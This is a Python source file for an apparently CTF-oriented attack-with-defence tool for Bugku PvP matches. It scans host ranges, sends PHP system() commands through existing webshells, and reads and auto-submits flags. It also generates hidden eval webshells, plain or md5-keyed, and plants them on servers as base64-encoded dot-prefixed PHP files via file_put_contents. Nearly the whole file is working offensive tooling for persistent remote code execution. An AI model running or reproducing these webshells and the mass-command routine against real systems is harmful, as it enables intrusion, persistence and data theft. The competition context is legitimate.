from __future__ import annotations

import base64
import concurrent.futures
import hashlib
import json
import os
import random
import re
import string
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from threading import Event
from typing import Optional
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen


BUGKU_DEFAULT_TOKEN = os.environ.get("AWD_BUGKU_TOKEN", "YOUR_TOKEN_HERE")
BUGKU_DEFAULT_DOMAIN = os.environ.get("AWD_BUGKU_DOMAIN", "pvp0000.example-awd.com")
BUGKU_DEFAULT_PATH = "/cms/cms/include/admin.php"
BUGKU_DEFAULT_CMD = "tac /f*"
BUGKU_SUBMIT_URL = "https://ctf.bugku.com/pvp/submit.html"
DEFAULT_SHELL_STORE = "attacker_shells.json"

FLAG_PATTERNS = [
    re.compile(r"flag\{[^}\r\n]{1,200}\}", re.I),
    re.compile(r"bugku\{[^}\r\n]{1,200}\}", re.I),
    re.compile(r"\b[a-f0-9]{32}\b", re.I),
]


@dataclass
class HttpResult:
    url: str
    status: Optional[int] = None
    text: str = ""
    error: str = ""

    @property
    def ok(self) -> bool:
        return self.status is not None and 200 <= self.status < 400 and not self.error


@dataclass
class BackdoorShell:
    number: int
    urls: list[str] = field(default_factory=list)
    key_method: str = "0"
    key: str = ""
    key_value: str = ""
    cmd_method: str = "POST"
    payload: str = ""
    note: str = ""

    def label(self) -> str:
        return f"{self.number}: {len(self.urls)} urls payload={self.payload or '-'} {self.note}".strip()


@dataclass
class GeneratedBackdoor:
    remote_file: str
    url_path: str
    payload: str
    key: str = ""
    key_value: str = ""
    php_content: str = ""


class AttackerSession:
    def __init__(self):
        self.active_urls: list[str] = []
        self.known_shells: list[BackdoorShell] = []
        self.next_number = 0

    def set_active_urls(self, urls: list[str]):
        self.active_urls = unique_urls(urls)

    def add_active_urls(self, urls: list[str]):
        self.active_urls = unique_urls(self.active_urls + urls)

    def add_shell(self, shell: BackdoorShell):
        shell.number = self.next_number
        self.next_number += 1
        self.known_shells.append(shell)
        return shell

    def get_shell(self, number: int) -> Optional[BackdoorShell]:
        for shell in self.known_shells:
            if shell.number == number:
                return shell
        return None

    def to_dict(self):
        return {
            "active_urls": self.active_urls,
            "next_number": self.next_number,
            "known_shells": [shell_to_dict(shell) for shell in self.known_shells],
        }

    def load_dict(self, data):
        self.active_urls = unique_urls(data.get("active_urls", []))
        self.known_shells = [shell_from_dict(item) for item in data.get("known_shells", [])]
        max_number = max([shell.number for shell in self.known_shells], default=-1)
        self.next_number = max(int(data.get("next_number", 0)), max_number + 1)

    def save(self, path=DEFAULT_SHELL_STORE):
        save_session(self, path)

    def load(self, path=DEFAULT_SHELL_STORE):
        loaded = load_session(path)
        self.load_dict(loaded.to_dict())


def shell_to_dict(shell: BackdoorShell):
    return {
        "number": shell.number,
        "urls": shell.urls,
        "key_method": shell.key_method,
        "key": shell.key,
        "key_value": shell.key_value,
        "cmd_method": shell.cmd_method,
        "payload": shell.payload,
        "note": shell.note,
    }


def shell_from_dict(data) -> BackdoorShell:
    return BackdoorShell(
        number=int(data.get("number", -1)),
        urls=unique_urls(data.get("urls", [])),
        key_method=str(data.get("key_method", "0")),
        key=str(data.get("key", "")),
        key_value=str(data.get("key_value", "")),
        cmd_method=str(data.get("cmd_method", "POST")),
        payload=str(data.get("payload", "")),
        note=str(data.get("note", "loaded")),
    )


def save_session(session: AttackerSession, path=DEFAULT_SHELL_STORE):
    out_path = Path(path)
    if out_path.parent and str(out_path.parent) != ".":
        out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(session.to_dict(), ensure_ascii=False, indent=2), encoding="utf-8")
    return str(out_path)


def load_session(path=DEFAULT_SHELL_STORE) -> AttackerSession:
    in_path = Path(path)
    if not in_path.exists():
        raise FileNotFoundError(f"后门配置文件不存在: {path}")
    data = json.loads(in_path.read_text(encoding="utf-8"))
    session = AttackerSession()
    session.load_dict(data)
    return session


def normalize_base_url(url: str) -> str:
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url if url.endswith("/") else url + "/"


def unique_urls(urls: list[str]) -> list[str]:
    result = []
    seen = set()
    for url in urls:
        clean = normalize_base_url(url)
        if clean and clean not in seen:
            seen.add(clean)
            result.append(clean)
    return result


def join_url(base_url: str, path: str) -> str:
    base = normalize_base_url(base_url)
    clean_path = path.strip()
    if clean_path.startswith("/"):
        clean_path = clean_path[1:]
    return base + clean_path


def site_root(url: str) -> str:
    parts = urlsplit(url)
    return f"{parts.scheme}://{parts.netloc}/"


def append_query(url: str, params: dict[str, str]) -> str:
    if not params:
        return url
    parts = urlsplit(url)
    new_query = urlencode(params)
    if parts.query:
        new_query = parts.query + "&" + new_query
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


def http_request(
    url: str,
    method: str = "GET",
    data: Optional[dict[str, str]] = None,
    timeout: float = 5.0,
    user_agent: str = "AWD-Tool/1.0",
) -> HttpResult:
    body = None
    if data:
        body = urlencode(data).encode("utf-8")
        method = "POST"
    req = Request(
        url,
        data=body,
        method=method,
        headers={"User-Agent": user_agent, "Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return HttpResult(url=url, status=resp.status, text=raw.decode("utf-8", "replace"))
    except HTTPError as exc:
        # 错误响应体读取同样可能超时/中断，不能让它穿透
        try:
            raw = exc.read()
        except Exception as read_exc:
            return HttpResult(url=url, status=exc.code, error=repr(read_exc))
        return HttpResult(url=url, status=exc.code, text=raw.decode("utf-8", "replace"), error="")
    except (URLError, TimeoutError, OSError, ValueError) as exc:
        # ValueError 覆盖 http.client.InvalidURL（URL 含控制字符时抛出）
        return HttpResult(url=url, error=repr(exc))


def scan_alive(
    url_pattern: str,
    output_file: str = "output.txt",
    start: int = 0,
    end: int = 255,
    threads: int = 64,
    timeout: float = 5.0,
    log_callback=print,
) -> list[str]:
    if "?" not in url_pattern:
        raise ValueError("URL 模板必须包含 ?，例如 http://192-168-1-?.awd.example-ctf.com/")

    def probe(idx: int) -> Optional[str]:
        target = normalize_base_url(url_pattern.replace("?", str(idx)))
        result = http_request(target, timeout=timeout)
        # 用 ok(200-399) 而非 status==200：301/302/403 同样是"服务存活"，
        # 否则会漏报大量存活站点
        if result.ok:
            log_callback(f"[+] 存活: {target}")
            return target
        return None

    active = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, threads)) as executor:
        futures = [executor.submit(probe, idx) for idx in range(start, end + 1)]
        for future in concurrent.futures.as_completed(futures):
            try:
                url = future.result()
            except Exception as exc:
                log_callback(f"[x] 探活任务异常: {exc!r}")
                continue
            if url:
                active.append(url)

    active = unique_urls(active)
    write_lines(output_file, active)
    log_callback(f"[*] 探活完成，存活 {len(active)} 个，已写入 {output_file}")
    return active


def write_lines(path: str, lines: list[str]):
    out_path = Path(path)
    if out_path.parent and str(out_path.parent) != ".":
        out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")


def read_active_file(path: str = "output.txt", log_callback=print) -> list[str]:
    in_path = Path(path)
    if not in_path.exists():
        raise FileNotFoundError(f"文件不存在: {path}")
    urls = []
    for line in in_path.read_text(encoding="utf-8", errors="ignore").splitlines():
        clean = line.strip()
        if clean and not clean.startswith("#"):
            urls.append(clean)
            log_callback(f"[*] 已读取: {clean}")
    return unique_urls(urls)


def check_known_backdoor(
    active_urls: list[str],
    path: str,
    key_method: str = "0",
    key: str = "",
    key_value: str = "",
    cmd_method: str = "POST",
    payload: str = "",
    timeout: float = 5.0,
    log_callback=print,
) -> Optional[BackdoorShell]:
    if not active_urls:
        log_callback("[!] 未加载存活主机")
        return None
    if not path.strip():
        log_callback("[!] 后门路径不能为空")
        return None

    found = []
    log_callback("[*] 正在检测已知后门...")
    for base_url in unique_urls(active_urls):
        url = join_url(base_url, path)
        result = http_request(url, timeout=timeout)
        # 后门存在时应直接返回 200；3xx 说明该路径被重定向(通常不存在)
        if result.status != 200:
            continue
        # 仅凭 200 会误判：伪静态/SPA 站点把 404 也返回 200 的整页 HTML。
        # 一句话马无参数时通常返回空白或极短内容，据此排除整页响应。
        head = result.text[:512].lower()
        looks_like_page = ("<!doctype" in head) or ("<html" in head)
        if looks_like_page:
            log_callback(f"[•] 跳过(返回整页HTML，疑似伪静态): {url}")
            continue
        found.append(url)
        log_callback(f"[+] 发现疑似后门: {url}")

    if not found:
        log_callback("[*] 未发现疑似后门")
        return None

    return BackdoorShell(
        number=-1,
        urls=found,
        key_method=key_method,
        key=key,
        key_value=key_value,
        cmd_method=cmd_method,
        payload=payload,
        note="known",
    )


def send_backdoor_command(
    url: str,
    key_method: str,
    key: str,
    key_value: str,
    command: str,
    cmd_method: str,
    payload: str,
    timeout: float = 8.0,
) -> HttpResult:
    params = {}
    data = {}
    key_method = normalize_method(key_method)
    cmd_method = normalize_method(cmd_method, default="POST")

    if key_method == "GET" and key:
        params[key] = key_value
    elif key_method == "POST" and key:
        data[key] = key_value

    if not payload:
        raise ValueError("命令参数名不能为空")
    if cmd_method == "GET":
        params[payload] = command
    else:
        data[payload] = command

    target = append_query(url, params)
    return http_request(target, data=data if data else None, timeout=timeout)


def execute_shell_command(
    shell: BackdoorShell,
    command: str,
    timeout: float = 8.0,
    log_callback=print,
) -> list[HttpResult]:
    results = []
    for url in shell.urls:
        result = send_backdoor_command(
            url,
            shell.key_method,
            shell.key,
            shell.key_value,
            command,
            shell.cmd_method,
            shell.payload,
            timeout=timeout,
        )
        results.append(result)
        status = result.status if result.status is not None else "ERR"
        if result.error:
            log_callback(f"[x] {url} status={status} error={result.error}")
        else:
            body = result.text.strip()
            if len(body) > 1000:
                body = body[:1000] + "\n...[truncated]"
            log_callback(f"[+] {url} status={status}\n{body}")
    return results


def make_php_system_command(command: str) -> str:
    return "system(%s);" % php_quote(command)


def collect_shell_flags(
    shell: BackdoorShell,
    command: str = BUGKU_DEFAULT_CMD,
    command_is_php: bool = False,
    timeout: float = 8.0,
    save_body_chars: int = 1000,
    log_callback=print,
):
    php_code = command if command_is_php else make_php_system_command(command)
    results = []
    for url in shell.urls:
        result = send_backdoor_command(
            url,
            shell.key_method,
            shell.key,
            shell.key_value,
            php_code,
            shell.cmd_method,
            shell.payload,
            timeout=timeout,
        )
        flags = extract_flags(result.text)
        status = result.status if result.status is not None else "ERR"
        item = {
            "time": datetime.now().isoformat(timespec="seconds"),
            "url": url,
            "status": result.status,
            "flags": flags,
            "body": result.text[:save_body_chars],
            "error": result.error,
        }
        results.append(item)
        prefix = "[+]" if flags else "[-]"
        log_callback("%s %s status=%s flags=%s" % (prefix, url, status, ",".join(flags) or "-"))
        if result.error:
            log_callback(f"[x] {url} error={result.error}")
    return results


def submit_flag_list(flags, token: str, timeout: float = 4.0, delay: float = 0.1, log_callback=print):
    submitted = []
    seen = set()
    for flag in flags:
        if not flag or flag in seen:
            continue
        seen.add(flag)
        submit_resp = submit_bugku_flag(flag, token, timeout)
        submit_status = submit_resp.status if submit_resp.status is not None else "ERR"
        submit_text = submit_resp.text.strip()[:200] or submit_resp.error
        log_callback("[submit] %s status=%s resp=%s" % (flag, submit_status, submit_text))
        submitted.append({"flag": flag, "status": submit_resp.status, "response": submit_text})
        time.sleep(delay)
    return submitted


def collect_and_submit_shell_flags(
    shell: BackdoorShell,
    command: str = BUGKU_DEFAULT_CMD,
    token: str = BUGKU_DEFAULT_TOKEN,
    submit: bool = True,
    command_is_php: bool = False,
    timeout: float = 8.0,
    delay: float = 0.1,
    out: str = "attacker_flag_results.jsonl",
    log_callback=print,
):
    results = collect_shell_flags(
        shell,
        command=command,
        command_is_php=command_is_php,
        timeout=timeout,
        log_callback=log_callback,
    )
    out_path = Path(out)
    if out_path.parent and str(out_path.parent) != ".":
        out_path.parent.mkdir(parents=True, exist_ok=True)

    all_flags = []
    for result in results:
        all_flags.extend(result["flags"])
        with out_path.open("a", encoding="utf-8") as log_fp:
            log_fp.write(json.dumps(result, ensure_ascii=False) + "\n")

    submitted = []
    if submit:
        submitted = submit_flag_list(all_flags, token, timeout=timeout, delay=delay, log_callback=log_callback)
    else:
        log_callback("[*] 只读取 flag，不提交")

    log_callback(f"[*] 读 flag 完成，结果已写入 {out_path}")
    return {"results": results, "submitted": submitted, "flags": all_flags, "out": str(out_path)}


def normalize_method(value: str, default: str = "0") -> str:
    value = str(value or default).strip().upper()
    if value in {"1", "GET"}:
        return "GET"
    if value in {"2", "POST"}:
        return "POST"
    return "0"


def random_token(length: int = 6) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def join_url_path(url_dir: str, filename: str) -> str:
    clean_dir = (url_dir or "/").strip()
    if not clean_dir.startswith("/"):
        clean_dir = "/" + clean_dir
    if not clean_dir.endswith("/"):
        clean_dir += "/"
    return clean_dir + filename


def php_quote(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def make_generated_backdoor(
    remote_dir: str = "/var/www/html/",
    url_dir: str = "/",
    with_key: bool = False,
) -> GeneratedBackdoor:
    filename = "." + random_token() + ".php"
    payload = random_token()
    remote_dir = (remote_dir or "/var/www/html/").rstrip("/")
    remote_file = f"{remote_dir}/{filename}"
    url_path = join_url_path(url_dir, filename)

    if with_key:
        key = random_token()
        key_value = random_token()
        key_hash = hashlib.md5(key_value.encode()).hexdigest()
        php_content = (
            "<?php if(md5(@$_POST[%s])===%s){@eval(@$_POST[%s]);} ?>"
            % (php_quote(key), php_quote(key_hash), php_quote(payload))
        )
        return GeneratedBackdoor(
            remote_file=remote_file,
            url_path=url_path,
            payload=payload,
            key=key,
            key_value=key_value,
            php_content=php_content,
        )

    php_content = "<?php @eval(@$_POST[%s]); ?>" % php_quote(payload)
    return GeneratedBackdoor(
        remote_file=remote_file,
        url_path=url_path,
        payload=payload,
        php_content=php_content,
    )


def make_write_payload(backdoor: GeneratedBackdoor) -> str:
    encoded = base64.b64encode(backdoor.php_content.encode("utf-8")).decode("ascii")
    return "file_put_contents(%s, base64_decode(%s));" % (
        php_quote(backdoor.remote_file),
        php_quote(encoded),
    )


def upload_generated_backdoor(
    source_shell: BackdoorShell,
    remote_dir: str = "/var/www/html/",
    url_dir: str = "/",
    with_key: bool = False,
    timeout: float = 8.0,
    log_callback=print,
) -> Optional[BackdoorShell]:
    generated = make_generated_backdoor(remote_dir=remote_dir, url_dir=url_dir, with_key=with_key)
    write_payload = make_write_payload(generated)
    new_urls = []

    log_callback(f"[*] 新后门远端文件: {generated.remote_file}")
    log_callback("[*] 正在通过已知后门写入新后门...")
    for old_url in source_shell.urls:
        result = send_backdoor_command(
            old_url,
            source_shell.key_method,
            source_shell.key,
            source_shell.key_value,
            write_payload,
            source_shell.cmd_method,
            source_shell.payload,
            timeout=timeout,
        )
        status = result.status if result.status is not None else "ERR"
        if result.error:
            log_callback(f"[x] 写入失败 {old_url} status={status} error={result.error}")
            continue
        new_url = site_root(old_url).rstrip("/") + generated.url_path
        new_urls.append(new_url)
        log_callback(f"[+] 写入完成 {old_url} -> {new_url}")

    if not new_urls:
        log_callback("[!] 没有成功写入任何新后门")
        return None

    if with_key:
        log_callback(f"[+] 新后门 key={generated.key} key值={generated.key_value} payload={generated.payload}")
        return BackdoorShell(
            number=-1,
            urls=new_urls,
            key_method="POST",
            key=generated.key,
            key_value=generated.key_value,
            cmd_method="POST",
            payload=generated.payload,
            note="generated-key",
        )

    log_callback(f"[+] 新后门 payload={generated.payload}")
    return BackdoorShell(
        number=-1,
        urls=new_urls,
        key_method="0",
        cmd_method="POST",
        payload=generated.payload,
        note="generated",
    )


def extract_flags(text: str) -> list[str]:
    found = []
    seen = set()
    for pattern in FLAG_PATTERNS:
        for match in pattern.findall(text):
            flag = match.strip()
            if flag and flag not in seen:
                seen.add(flag)
                found.append(flag)
    return found


def make_bugku_backdoor_url(host: str, path: str, cmd: str) -> str:
    """构造 Bugku 后门 URL。

    注意：这里必须用 php_quote 生成 PHP 字面量，不能用 Python 的 repr()。
    repr 会因引号选择而改变转义语义（例如命令含 \\ 或 $ 时被 PHP 双引号
    二次解释/变量插值），导致实际执行的不是原命令。
    """
    query = urlencode({"s": make_php_system_command(cmd)})
    clean_path = path if path.startswith("/") else "/" + path
    return "http://%s%s?%s" % (host, clean_path, query)


def parse_range(value: str) -> list[int]:
    value = str(value).strip()
    if not value:
        return []
    result = []
    for part in value.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            start, end = part.split("-", 1)
            result.extend(range(int(start), int(end) + 1))
        else:
            result.append(int(part))
    return result


def parse_excludes(value: str) -> set[int]:
    return set(parse_range(value))


def probe_bugku_target(idx: int, domain: str, path: str, cmd: str, timeout: float, save_body_chars: int):
    host = "192-168-1-%d.%s" % (idx, domain)
    url = make_bugku_backdoor_url(host, path, cmd)
    result = {
        "idx": idx,
        "host": host,
        "url": url,
        "ok": False,
        "status": None,
        "flags": [],
        "body": "",
        "error": "",
    }
    resp = http_request(url, timeout=timeout, user_agent="Bugku-AWD-Helper/1.0")
    result["status"] = resp.status
    result["body"] = resp.text[:save_body_chars]
    result["flags"] = extract_flags(resp.text)
    result["ok"] = resp.status == 200 and bool(result["flags"])
    result["error"] = resp.error
    return result


def submit_bugku_flag(flag: str, token: str, timeout: float):
    query = urlencode({"token": token, "flag": flag})
    url = "%s?%s" % (BUGKU_SUBMIT_URL, query)
    return http_request(url, timeout=timeout, user_agent="Bugku-AWD-Helper/1.0")


def bugku_batch_submit(
    domain: str = BUGKU_DEFAULT_DOMAIN,
    path: str = BUGKU_DEFAULT_PATH,
    cmd: str = BUGKU_DEFAULT_CMD,
    token: str = BUGKU_DEFAULT_TOKEN,
    target_range: str = "1-255",
    exclude: str = "",
    threads: int = 32,
    timeout: float = 4.0,
    delay: float = 0.1,
    no_submit: bool = False,
    out: str = "bugku_pvp_results.jsonl",
    save_body_chars: int = 1000,
    stop_event: Optional[Event] = None,
    log_callback=print,
):
    excluded = parse_excludes(exclude)
    targets = [idx for idx in parse_range(target_range) if idx not in excluded]
    submitted = set()
    out_path = Path(out)
    if out_path.parent and str(out_path.parent) != ".":
        out_path.parent.mkdir(parents=True, exist_ok=True)

    log_callback(f"[*] targets={len(targets)} domain={domain} path={path}")
    log_callback(f"[*] command={cmd}")
    if no_submit:
        log_callback("[*] 仅探测模式，不提交 flag")

    with out_path.open("a", encoding="utf-8") as log_fp:
        # 不用 with 管理 executor：with 退出时会 shutdown(wait=True)，
        # 必须等待所有已排队任务跑完，"停止"按钮会长时间无响应。
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=max(1, threads))
        stopped = False
        try:
            future_map = {
                executor.submit(probe_bugku_target, idx, domain, path, cmd, timeout, save_body_chars): idx
                for idx in targets
            }
            for future in concurrent.futures.as_completed(future_map):
                if stop_event and stop_event.is_set():
                    stopped = True
                    executor.shutdown(wait=False, cancel_futures=True)
                    log_callback("[*] 已收到停止信号，未开始的任务已取消")
                    break
                try:
                    result = future.result()
                except Exception as exc:
                    log_callback(f"[x] 目标 {future_map.get(future)} 异常: {exc!r}")
                    continue
                result["time"] = datetime.now().isoformat(timespec="seconds")
                log_fp.write(json.dumps(result, ensure_ascii=False) + "\n")
                log_fp.flush()

                prefix = "[+]" if result["flags"] else "[-]"
                status = result["status"] if result["status"] is not None else "ERR"
                log_callback(
                    "%s %s status=%s flags=%s"
                    % (prefix, result["host"], status, ",".join(result["flags"]) or "-")
                )

                if no_submit:
                    continue

                for flag in result["flags"]:
                    if flag in submitted:
                        continue
                    submitted.add(flag)
                    submit_resp = submit_bugku_flag(flag, token, timeout)
                    submit_status = submit_resp.status if submit_resp.status is not None else "ERR"
                    submit_text = submit_resp.text.strip()[:200] or submit_resp.error
                    log_callback("[submit] %s status=%s resp=%s" % (flag, submit_status, submit_text))
                    time.sleep(delay)
        finally:
            executor.shutdown(wait=not stopped)

    log_callback(f"[*] done, log saved to {out_path}")
